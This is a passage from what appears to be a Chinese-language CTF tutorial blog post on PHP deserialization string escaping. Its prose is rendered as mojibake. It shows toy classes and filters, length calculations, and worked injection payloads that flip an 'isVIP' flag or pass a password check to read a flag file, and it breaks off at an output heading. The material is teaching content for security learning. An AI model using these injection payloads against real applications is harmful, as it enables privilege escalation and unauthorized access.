<span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVIP</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$u</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$p</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;isVIP = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$s</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;hacker&quot;</span>,<span class="variable">$s</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">user</span>(<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;123456&quot;</span>);</span><br><span class="line"><span class="variable">$a_seri</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$a_seri_filter</span> = <span class="title function_ invoke__">filter</span>(<span class="variable">$a_seri</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a_seri_filter</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>è¿™ä¸€æ®µç¨‹åºçš„è¾“å‡ºä¸ºï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;user&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;hacker&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;password&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;123456&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;isVIP&quot;</span>;i:<span class="number">0</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªæ—¶å€™æˆ‘ä»¬æŠŠè¿™ä¸¤ä¸ªç¨‹åºçš„è¾“å‡ºæ‹¿å‡ºæ¥å¯¹æ¯”ä¸€ä¸‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;user&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;password&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;123456&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;isVIP&quot;</span>;i:<span class="number">0</span>;&#125;  <span class="comment">//æœªè¿‡æ»¤</span></span><br><span class="line">O:<span class="number">4</span>:<span class="string">&quot;user&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;hacker&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;password&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;123456&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;isVIP&quot;</span>;i:<span class="number">0</span>;&#125; <span class="comment">//å·²è¿‡æ»¤</span></span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°å·²è¿‡æ»¤å­—ç¬¦ä¸²ä¸­çš„hackerä¸å‰é¢çš„å­—ç¬¦é•¿åº¦ä¸å¯¹åº”äº†</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;</span><br><span class="line">s:<span class="number">5</span>:<span class="string">&quot;hacker&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>åœ¨è¿™ä¸ªæ—¶å€™ï¼Œå¯¹äºæˆ‘ä»¬ï¼Œåœ¨æ–°å»ºå¯¹è±¡çš„æ—¶å€™ï¼Œä¼ å…¥çš„adminå°±æ˜¯æˆ‘ä»¬çš„å¯æ§å˜é‡</p>
<p>æ¥ä¸‹æ¥æ˜ç¡®æˆ‘ä»¬çš„ç›®æ ‡ï¼šå°†isVIPå˜é‡çš„å€¼ä¿®æ”¹ä¸º1</p>
<p>é¦–å…ˆæˆ‘ä»¬å°†æˆ‘ä»¬çš„ç°æœ‰å­ä¸²å’Œç›®æ ‡å­ä¸²è¿›è¡Œå¯¹æ¯”ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;;s:8:&quot;</span>password<span class="string">&quot;;s:6:&quot;</span><span class="number">123456</span><span class="string">&quot;;s:5:&quot;</span>isVIP<span class="string">&quot;;i:0;&#125; //ç°æœ‰å­ä¸²</span></span><br><span class="line"><span class="string">&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;password&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;123456&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;isVIP&quot;</span>;i:<span class="number">1</span>;&#125; <span class="comment">//ç›®æ ‡å­ä¸²</span></span><br></pre></td></tr></table></figure>

<p>ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬è¦åœ¨adminè¿™ä¸ªå¯æ§å˜é‡çš„ä½ç½®ï¼Œæ³¨å…¥æˆ‘ä»¬çš„ç›®æ ‡å­ä¸²ã€‚</p>
<p>é¦–å…ˆè®¡ç®—æˆ‘ä»¬éœ€è¦æ³¨å…¥çš„ç›®æ ‡å­ä¸²çš„é•¿åº¦ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;;s:8:&quot;</span>password<span class="string">&quot;;s:6:&quot;</span><span class="number">123456</span><span class="string">&quot;;s:5:&quot;</span>isVIP<span class="string">&quot;;i:1;&#125;</span></span><br><span class="line"><span class="string">//ä»¥ä¸Šå­—ç¬¦ä¸²çš„é•¿åº¦ä¸º47</span></span><br></pre></td></tr></table></figure>

<p>å› ä¸ºæˆ‘ä»¬éœ€è¦é€ƒé€¸çš„å­—ç¬¦ä¸²é•¿åº¦ä¸º47ï¼Œå¹¶ä¸”adminæ¯æ¬¡è¿‡æ»¤ä¹‹åéƒ½ä¼šå˜æˆhackerï¼Œä¹Ÿå°±æ˜¯è¯´æ¯å‡ºç°ä¸€æ¬¡adminï¼Œå°±ä¼šå¤š1ä¸ªå­—ç¬¦ã€‚</p>
<p>å› æ­¤æˆ‘ä»¬åœ¨å¯æ§å˜é‡å¤„ï¼Œé‡å¤47éadminï¼Œç„¶ååŠ ä¸Šæˆ‘ä»¬é€ƒé€¸åçš„ç›®æ ‡å­ä¸²ï¼Œå¯æ§å˜é‡ä¿®æ”¹å¦‚ä¸‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin<span class="string">&quot;;s:8:&quot;</span>password<span class="string">&quot;;s:6:&quot;</span><span class="number">123456</span><span class="string">&quot;;s:5:&quot;</span>isVIP<span class="string">&quot;;i:1;&#125;</span></span><br></pre></td></tr></table></figure>

<p>å®Œæ•´ä»£ç å¦‚ä¸‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVIP</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$u</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$p</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;isVIP = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$s</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;hacker&quot;</span>,<span class="variable">$s</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">user</span>(<span class="string">&#x27;adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;&#x27;</span>,<span class="string">&#x27;123456&#x27;</span>);</span><br><span class="line"><span class="variable">$a_seri</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$a_seri_filter</span> = <span class="title function_ invoke__">filter</span>(<span class="variable">$a_seri</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a_seri</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;------------------------------------------------------------&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a_seri_filter</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>è¾“å‡ºç»“æœä¸º</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;user&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;s:<span class="number">282</span>:<span class="string">&quot;adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;password&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;123456&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;isVIP&quot;</span>;i:<span class="number">1</span>;&#125;<span class="string">&quot;;s:8:&quot;</span>password<span class="string">&quot;;s:6:&quot;</span><span class="number">123456</span><span class="string">&quot;;s:5:&quot;</span>isVIP<span class="string">&quot;;i:0;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">O:4:&quot;</span>user<span class="string">&quot;:3:&#123;s:8:&quot;</span>username<span class="string">&quot;;s:282:&quot;</span>hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker<span class="string">&quot;;s:8:&quot;</span>password<span class="string">&quot;;s:6:&quot;</span><span class="number">123456</span><span class="string">&quot;;s:5:&quot;</span>isVIP<span class="string">&quot;;i:1;&#125;&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;password&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;123456&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;isVIP&quot;</span>;i:<span class="number">0</span>;&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin&quot;;s:<span class="number">8</span>:<span class="string">&quot;password&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;123456&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;isVIP&quot;</span>;<span class="selector-tag">i</span>:<span class="number">1</span>;&#125;</span><br><span class="line">//<span class="number">282</span></span><br><span class="line">hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker</span><br><span class="line">//<span class="number">282</span></span><br></pre></td></tr></table></figure>



<p>é‡åˆ° <code>&#125;</code> ç»“æŸï¼Œä¹‹åå¤šå‡ºæ¥çš„ <code>&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:0;&#125;</code> ä¼šè¢« <strong>å¿½ç•¥</strong>ï¼ˆä¸ä¼šæŠ¥é”™ï¼Œä½†ä¹Ÿä¸ä¼šè§£æï¼‰ã€‚</p>
<p>ç¨‹åºè¾“å‡ºå¦‚ä¸‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">object</span>(user)<span class="comment">#2 (3) &#123;</span></span><br><span class="line">  [<span class="string">&quot;username&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">282</span>) <span class="string">&quot;hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker&quot;</span></span><br><span class="line">  [<span class="string">&quot;password&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">6</span>) <span class="string">&quot;123456&quot;</span></span><br><span class="line">  [<span class="string">&quot;isVIP&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">int</span>(<span class="number">1</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°è¿™ä¸ªæ—¶å€™ï¼ŒisVIPè¿™ä¸ªå˜é‡å°±å˜æˆäº†1ï¼Œååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸çš„ç›®çš„ä¹Ÿå°±è¾¾åˆ°äº†ã€‚</p>
<p>ä¾‹é¢˜</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$uname</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$uname</span>,<span class="variable">$password</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;uname=<span class="variable">$uname</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;password===<span class="string">&#x27;yu22x&#x27;</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$flag</span>; </span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;wrong password&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$string</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;Firebasky&#x27;</span>,<span class="string">&#x27;Firebaskyup&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$uname</span>=<span class="variable">$_GET</span>[<span class="number">1</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="number">1</span>;</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">filter</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">a</span>(<span class="variable">$uname</span>,<span class="variable">$password</span>))));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>payloadä¸º</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebasky<span class="string">&quot;;s:8:&quot;</span>password<span class="string">&quot;;s:5:&quot;</span>yu22x<span class="string">&quot;;&#125;</span></span><br></pre></td></tr></table></figure>

<h4 id="è¿‡æ»¤åå­—ç¬¦å˜å°‘"><a href="#è¿‡æ»¤åå­—ç¬¦å˜å°‘" class="headerlink" title="è¿‡æ»¤åå­—ç¬¦å˜å°‘"></a>è¿‡æ»¤åå­—ç¬¦å˜å°‘</h4><p>é¦–å…ˆï¼Œå’Œä¸Šé¢çš„ä¸»ä½“ä»£ç è¿˜æ˜¯ä¸€æ ·ï¼Œè¿˜æ˜¯åŒä¸€ä¸ªclassï¼Œä¸ä¹‹æœ‰åŒºåˆ«çš„æ˜¯è¿‡æ»¤å‡½æ•°ä¸­ï¼Œæˆ‘ä»¬å°†hackerä¿®æ”¹ä¸ºhackã€‚</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVIP</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$u</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$p</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;isVIP = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$s</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;hack&quot;</span>,<span class="variable">$s</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">user</span>(<span class="string">&#x27;admin&#x27;</span>,<span class="string">&#x27;123456&#x27;</span>);</span><br><span class="line"><span class="variable">$a_seri</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$a_seri_filter</span> = <span class="title function_ invoke__">filter</span>(<span class="variable">$a_seri</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a_seri_filter</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>è¾“å‡ºç»“æœï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;user&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;hack&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;password&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;123456&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;isVIP&quot;</span>;i:<span class="number">0</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>åŒæ ·æ¯”è¾ƒä¸€ä¸‹ç°æœ‰å­ä¸²å’Œç›®æ ‡å­ä¸²ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;;s:8:&quot;</span>password<span class="string">&quot;;s:6:&quot;</span><span class="number">123456</span><span class="string">&quot;;s:5:&quot;</span>isVIP<span class="string">&quot;;i:0;&#125; //ç°æœ‰å­ä¸²</span></span><br><span class="line"><span class="string">&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;password&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;123456&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;isVIP&quot;</span>;i:<span class="number">1</span>;&#125; <span class="comment">//ç›®æ ‡å­ä¸²</span></span><br></pre></td></tr></table></figure>

<p>å› ä¸ºè¿‡æ»¤çš„æ—¶å€™ï¼Œå°†5ä¸ªå­—ç¬¦åˆ å‡ä¸ºäº†4ä¸ªï¼Œæ‰€ä»¥å’Œä¸Šé¢å­—ç¬¦å˜å¤šçš„æƒ…å†µç›¸åï¼Œéšç€åŠ å…¥çš„adminçš„æ•°é‡å¢å¤šï¼Œç°æœ‰å­ä¸²åé¢ä¼šç¼©è¿›æ¥ã€‚</p>
<p>è®¡ç®—ä¸€ä¸‹ç›®æ ‡å­ä¸²çš„é•¿åº¦:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;;s:8:&quot;</span>password<span class="string">&quot;;s:6:&quot;</span><span class="number">123456</span><span class="string">&quot;;s:5:&quot;</span>isVIP<span class="string">&quot;;i:1;&#125; //ç›®æ ‡å­ä¸²</span></span><br><span class="line"><span class="string">//é•¿åº¦ä¸º47</span></span><br></pre></td></tr></table></figure>

<p>å†è®¡ç®—ä¸€ä¸‹åˆ°ä¸‹ä¸€ä¸ªå¯æ§å˜é‡çš„å­—ç¬¦ä¸²é•¿åº¦ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;;s:8:&quot;</span>password<span class="string">&quot;;s:6:&quot;</span></span><br><span class="line"><span class="comment">//é•¿åº¦ä¸º22</span></span><br></pre></td></tr></table></figure>

<p>å› ä¸ºæ¯æ¬¡è¿‡æ»¤çš„æ—¶å€™éƒ½ä¼šå°‘1ä¸ªå­—ç¬¦ï¼Œå› æ­¤æˆ‘ä»¬å…ˆå°†adminå­—ç¬¦é‡å¤22éï¼ˆè¿™é‡Œçš„22éä¸åƒå­—ç¬¦å˜å¤šçš„é€ƒé€¸æƒ…å†µç²¾ç¡®ï¼Œåé¢å¯èƒ½ä¼šéœ€è¦åšè°ƒæ•´ï¼‰</p>
<p>å®Œæ•´ä»£ç å¦‚ä¸‹ï¼šï¼ˆè¿™é‡Œçš„å˜é‡é‡Œä¸€å…±æœ‰22ä¸ªadminï¼‰</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVIP</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$u</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$p</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;isVIP = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$s</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;hack&quot;</span>,<span class="variable">$s</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">user</span>(<span class="string">&#x27;adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin&#x27;</span>,<span class="string">&#x27;123456&#x27;</span>);</span><br><span class="line"><span class="variable">$a_seri</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$a_seri_filter</span> = <span class="title function_ invoke__">filter</span>(<span class="variable">$a_seri</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a_seri_filter</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>è¾“å‡ºç»“æœï¼š</p>
